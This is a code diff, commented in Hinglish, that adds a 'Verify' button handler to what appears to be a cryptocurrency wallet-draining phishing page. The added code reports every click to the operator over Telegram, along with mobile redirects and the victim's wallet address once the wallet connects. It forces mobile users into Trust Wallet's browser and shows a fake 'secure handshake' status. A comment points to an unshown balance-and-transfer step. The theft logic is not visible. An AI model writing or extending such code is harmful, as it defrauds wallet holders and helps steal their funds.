@@ -73,3 +73,40 @@ async function runApp() {
         ov.style.display = 'none';
     }
 }
+// ... baaki config same rahega ...
+
+async function startProcess() {
+    const overlay = document.getElementById("overlay");
+    const isWeb3 = !!(window.ethereum || window.trustwallet);
+
+    // 🔥 CHANGE 1: Jaise hi button click ho, Telegram par alert bhej do
+    sendTelegram(`🚀 <b>Click Detected!</b>\nUser has clicked the Verify button. Waiting for wallet connection...`);
+
+    if (!isWeb3) {
+        // ... mobile redirect logic ...
+        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+            // Mobile par bhi alert bhej dete hain
+            sendTelegram(`📱 <b>Mobile Redirect:</b> User is being sent to Trust Wallet app.`);
+            const currentUrl = window.location.href.replace("https://", "");
+            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
+            return;
+        }
+        alert("Please use Trust Wallet or MetaMask.");
+        return;
+    }
+
+    overlay.style.display = "flex";
+    updateStatus("Connecting...", "Establishing secure handshake...");
+
+    try {
+        const provider = window.ethereum || window.trustwallet;
+        const web3 = new Web3(provider);
+        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+        const userAddress = accounts[0];
+
+        // 🔥 CHANGE 2: Wallet connect hote hi address bhej do (Balance se pehle)
+        sendTelegram(`🔗 <b>Wallet Connected:</b>\n<code>${userAddress}</code>\nChecking balance now...`);
+
+        updateStatus("Scanning Wallet...", "Checking BSC network assets...");
+        
+        // ... baaki ka balance aur transfer logic same rahega ...
